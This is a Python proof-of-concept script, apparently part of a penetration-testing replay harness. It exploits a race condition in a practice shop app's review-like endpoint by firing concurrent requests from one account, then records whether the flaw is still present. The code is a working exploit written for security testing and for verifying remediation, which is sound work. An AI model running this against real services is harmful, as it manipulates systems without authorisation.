#!/usr/bin/env python3
"""pt22: a race condition lets one account like the same review repeatedly.

Found black-box, before reading any source: liking a review via the UI
showed every review as already "liked," including to a completely
anonymous curl request with no auth at all. Firing several concurrent
like requests from one account against one review produced more than
one successful like. Corroborated afterward against the real source
(likeProductReviews.js): the "already liked" check reads stale state,
then the code sleeps 150ms before writing the updated likedBy array, a
textbook check-then-act race window the vendor's own code comment
admits is deliberate ("Artificial wait for timing attack challenge").

Uses real OS threads (not sequential requests) so the concurrent
requests actually overlap in time; urllib calls block on I/O, which is
enough for threads to achieve true concurrent dispatch.

Standard library only (urllib, json, threading).
"""

from __future__ import annotations

import argparse
import json
import sys
import threading
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt22-001.json"


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register_and_login(target: str, label: str, stamp: str) -> str:
    email = f"pt22-{label}-{stamp}@flatline.test"
    password = "Pt22Pass123!"
    _request("POST", f"{target}/api/Users", body={"email": email, "password": password, "passwordRepeat": password})
    status, body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    return body["authentication"]["token"]


def _fire_concurrent_likes(target: str, token: str, review_id: str, n: int) -> list[int]:
    statuses: list[int] = []
    lock = threading.Lock()

    def one_request():
        status, _ = _request("POST", f"{target}/rest/products/reviews", token=token, body={"id": review_id})
        with lock:
            statuses.append(status)

    threads = [threading.Thread(target=one_request) for _ in range(n)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    return statuses


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    victim_token = _register_and_login(target, "victim", stamp)
    _, create_body = _request("PUT", f"{target}/rest/products/1/reviews", token=victim_token, body={"message": f"pt22 race-test review {stamp}", "product": "1"})

    _, reviews_body = _request("GET", f"{target}/rest/products/1/reviews")
    target_review = next(r for r in reviews_body["data"] if r["message"] == f"pt22 race-test review {stamp}")
    review_id = target_review["_id"]

    attacker_token = _register_and_login(target, "attacker", stamp)
    attacker_email = f"pt22-attacker-{stamp}@flatline.test"
    n = blueprint["concurrent_request_count"]
    statuses = _fire_concurrent_likes(target, attacker_token, review_id, n)

    _, final_body = _request("GET", f"{target}/rest/products/1/reviews")
    final_review = next(r for r in final_body["data"] if r["_id"] == review_id)
    attacker_like_count = final_review["likedBy"].count(attacker_email)

    if attacker_like_count > 1:
        status = "VULNERABLE"
        summary = f"{n} concurrent requests produced {attacker_like_count} entries for the same account in likedBy (status codes: {statuses})."
    elif attacker_like_count <= 1:
        status = "REMEDIATED"
        summary = f"{n} concurrent requests produced at most 1 entry for the same account in likedBy (status codes: {statuses})."
    else:
        status = "ERROR"
        summary = f"Inconclusive: attacker_like_count={attacker_like_count}, statuses={statuses}."

    legit_token = _register_and_login(target, "legit", stamp)
    legit_email = f"pt22-legit-{stamp}@flatline.test"
    legit_status, _ = _request("POST", f"{target}/rest/products/reviews", token=legit_token, body={"id": review_id})
    _, legit_check_body = _request("GET", f"{target}/rest/products/1/reviews")
    legit_review = next(r for r in legit_check_body["data"] if r["_id"] == review_id)
    legitimate_single_like_ok = legit_status == 200 and legit_review["likedBy"].count(legit_email) == 1

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "target": target,
        "status": status,
        "concurrent_request_count": n,
        "attacker_like_count": attacker_like_count,
        "summary": summary,
        "legitimate_single_like_ok": legitimate_single_like_ok,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt22-review-like-race-condition", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
